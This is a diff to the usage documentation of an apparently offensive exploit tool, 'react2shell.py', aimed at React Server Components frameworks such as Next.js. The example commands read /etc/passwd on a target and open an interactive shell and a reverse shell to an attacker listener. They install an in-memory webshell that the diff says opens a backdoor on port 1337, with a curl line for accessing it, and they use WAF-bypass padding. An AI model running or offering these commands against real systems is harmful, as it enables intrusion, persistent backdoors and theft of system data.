@@ -133,8 +133,9 @@ python react2shell.py https://target.com -c "cat /etc/passwd" -w -u
 # Interactive shell through proxy
 python react2shell.py https://target.com -i -x http://127.0.0.1:8080
 
-# Install in-memory webshell
+# Install in-memory webshell (creates backdoor on port 1337)
 python react2shell.py https://target.com --webshell mypassword
+# Access: curl 'http://target:1337/?p=mypassword&cmd=id'
 
 # Reverse shell
 python react2shell.py https://target.com -r -l 10.0.0.1 -p 4444 -S bash
@@ -167,7 +168,8 @@ Scanning Options:
   -F, --framework       Target framework (auto, nextjs, waku, react-router, expo)
   -E, --enumerate       Enumerate RSC endpoints before exploitation
   --detect              Only detect framework and list endpoints
-  --webshell            Install in-memory webshell
+  --webshell            Install in-memory webshell on port 1337
+  --rce                 RCE proof-of-concept mode (default: safe mode)
 
 Bypass Options:
   -w, --waf-bypass      Junk data padding
